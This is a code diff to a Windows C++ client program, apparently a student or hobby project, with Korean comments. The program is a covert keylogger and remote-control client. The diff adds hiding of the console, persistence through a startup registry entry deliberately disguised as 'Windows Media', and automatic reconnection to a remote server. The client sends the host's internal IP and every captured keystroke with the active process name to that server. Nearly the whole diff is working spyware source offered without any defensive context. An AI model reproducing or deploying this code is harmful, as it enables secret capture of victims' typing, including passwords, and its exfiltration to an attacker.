@@ -1,6 +1,7 @@
 ﻿// NotepadMasterCilent.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
 //
 #include <iostream>
+#include <fstream>
 #include <windows.h>
 #include <tchar.h>
 #include <conio.h>
@@ -11,6 +12,7 @@
 #include "util.h"
 #include "definition.h"
 
+#define CONNECT_DELAY 2500
 #define BUFF_SIZE 2000
 #define TYPING_DELAY 150
 
@@ -32,46 +34,23 @@ void ResetNotepad()
 	while (!h_edit)
 		h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
 }
-
-UINT WINAPI keylog(void* arg);
-
-int main()
+int InitConnect(const WSADATA* wsa, SOCKET* s, const char* IP)
 {
-
-	WSADATA wsa;
-	SOCKET s;
 	struct sockaddr_in server;
-	
-	PDUHello pdu_hello;
-	PDUMessage* pdu_recv;
-	PDUCommand* pdu_command;
 
-	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-	{
-		cerr << "초기화 실패. 에러코드: %d" << WSAGetLastError();
-		_getch();
-		return 1;
-	}
-
-	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+	if ((*s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
 	{
 		cerr << "소켓 생성 실패 : " << WSAGetLastError();
 		WSACleanup();
 		_getch();
-		return 1;
+		return NULL;
 	}
-
-	char IP[30] = "";
-	cout << "IP : ";
-	cin >> IP;
 
 	server.sin_addr.s_addr = inet_addr(IP);
 	server.sin_family = AF_INET;
 	server.sin_port = htons(44401);
-
-	ShowWindow(GetForegroundWindow(), SW_HIDE);
-
-	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
+	
+	while (connect(*s, (struct sockaddr *)&server, sizeof(server)) < 0)
 	{
 		cerr << "연결 실패.";
 
@@ -88,19 +67,102 @@ int main()
 		default:
 			cout << "에러코드: " << WSAGetLastError() << endl;
 		}
-		closesocket(s);
-		WSACleanup();
-		_getch();
-		return 1;
+		Sleep(CONNECT_DELAY);
 	}
 
 	cout << "성공" << endl;
 
 	// 첫 연결시 내부망IP 전송
+	PDUHello pdu_hello;
+
 	pdu_hello.protocol_type = HELLO;
 	char hostname[20] = "";
 	if (gethostname(hostname, 50) == 0)
 		strcpy_s(pdu_hello.internal_ip, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));
+
+	send(*s, (const char*)&pdu_hello, sizeof(PDUHello), 0);
+	system("taskkill /im notepad.exe -f");
+
+	return 1;
+}
+UINT WINAPI keylog(void* arg);
+
+int _tmain(int argc, TCHAR* argv[])
+{
+	// 콘솔창 빠르게 숨기기
+	HWND myWnd = GetConsoleWindow();
+	ShowWindow(myWnd, SW_HIDE);
+
+	WSADATA wsa;
+	SOCKET s;
+	
+	PDUMessage* pdu_recv;
+	PDUCommand* pdu_command;
+
+	char IP[30] = "";
+	TCHAR appdata_dir[MAX_PATH] = TEXT("");
+	TCHAR inifile_dir[MAX_PATH] = TEXT("");
+	fstream inifile;
+
+	GetEnvironmentVariable(TEXT("APPDATA"), appdata_dir, MAX_PATH);
+	wcscat_s(appdata_dir, TEXT("\\Windows Media"));
+	wcscpy_s(inifile_dir, appdata_dir);
+	wcscat_s(inifile_dir, TEXT("\\network.txt"));
+
+	// 더블클릭으로 실행된 경우
+	if (argc == 1)
+	{
+		ShowWindow(myWnd, SW_SHOW);
+
+		cout << "IP : ";	cin >> IP;
+		cout << "시작프로그램으로 등록하시겠습니까?[yes or no] : ";
+		char input;
+		do
+		{
+			input = _getch();
+			input = toupper(input);
+		} while (input != 'Y' && input  != 'N');
+		cout << input;
+
+		if (input == 'Y')
+		{
+			// 설정파일에 IP기록
+			CreateDirectory(appdata_dir, NULL);
+			inifile.open(inifile_dir, ios_base::out);
+			if (inifile.fail())
+				printf("file fail\n");
+			inifile << IP;
+			inifile.close();
+
+			// 레지스트리에 시작프로그램으로 등록, Windows Media는 눈속임
+			TCHAR optional_cmdline[MAX_PATH] = TEXT("\"");
+			wcscat_s(optional_cmdline, MAX_PATH, argv[0]);
+			wcscat_s(optional_cmdline, TEXT("\" --pass"));
+			SetRegistryStartProgram(TRUE, TEXT("Windows Media"), optional_cmdline);
+
+			cout << endl;
+			system("PAUSE");
+		}
+	}
+	// 시작프로그램으로 실행된 경우
+	else
+	{
+		inifile.open(inifile_dir);
+		inifile >> IP;
+		inifile.close();
+	}
+
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+	{
+		cerr << "초기화 실패. 에러코드: %d" << WSAGetLastError();
+		return 1;
+	}
+
+	ShowWindow(myWnd, SW_HIDE);
+
+	InitConnect(&wsa, &s, IP);
+
+	system("taskkill /im notepad.exe -f");
 
 	Sleep(500); // 클라이언트 프로그램에 입력된 엔터키 전송 방지
 	UINT dwThreadID;
@@ -108,15 +170,6 @@ int main()
 	hThread = (HANDLE)_beginthreadex(NULL, 0, keylog, &s, 0, (unsigned*)&dwThreadID);
 	if (hThread == 0)
 		cerr << "beginhandlethreadex error";
-
-	if (send(s, (const char*)&pdu_hello, sizeof(PDUHello), 0) < 0)
-	{
-		system("cls");
-		cerr << "서버와의 연결이 끊어졌습니다." << endl;
-		closesocket(s);
-		exit(1);
-	}
-	system("taskkill /im notepad.exe -f");
 
 	while (TRUE)
 	{
@@ -127,8 +180,9 @@ int main()
 		{
 			system("cls");
 			cerr << "서버와의 연결이 끊어졌습니다." << endl;
+			cerr << "재연결을 시도합니다" << endl;
 			closesocket(s);
-			exit(1);
+			InitConnect(&wsa, &s, IP);
 		}
 		int nLen = 0;
 
@@ -172,7 +226,7 @@ UINT WINAPI keylog(void* arg)
 	PDUKeylog pdu_keylog;
 	pdu_keylog.protocol_type = KEYLOG;
 
-	char LowToHigh[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')' };
+	const char LowToHigh[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')' };
 
 	while (1) {
 		UCHAR key = NULL;
@@ -203,12 +257,7 @@ UINT WINAPI keylog(void* arg)
 			FindProcessName(dwPID, pdu_keylog.process_name);
 			pdu_keylog.state = key;
 
-			if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
-			{
-				cout << "서버와의 연결이 끊어졌습니다." << endl;
-				closesocket(s);
-				exit(1);
-			}
+			send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0);
 		}
 			
 		for (key = 0x30; key <= 0x39; key++) // 키를 돌려가면서 판별
@@ -223,12 +272,7 @@ UINT WINAPI keylog(void* arg)
 				GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
 				FindProcessName(dwPID, pdu_keylog.process_name);
 
-				if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
-				{
-					cout << "서버와의 연결이 끊어졌습니다." << endl;
-					closesocket(s);
-					exit(1);
-				}
+				send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0);
 			}
 		}
 		for (key = 0x40; key <= 0x5A; key++) // 키를 돌려가면서 판별
@@ -243,12 +287,7 @@ UINT WINAPI keylog(void* arg)
 				GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
 				FindProcessName(dwPID, pdu_keylog.process_name);
 
-				if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
-				{
-					cout << "서버와의 연결이 끊어졌습니다." << endl;
-					closesocket(s);
-					exit(1);
-				}
+				send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0);
 			}
 		}
 	}
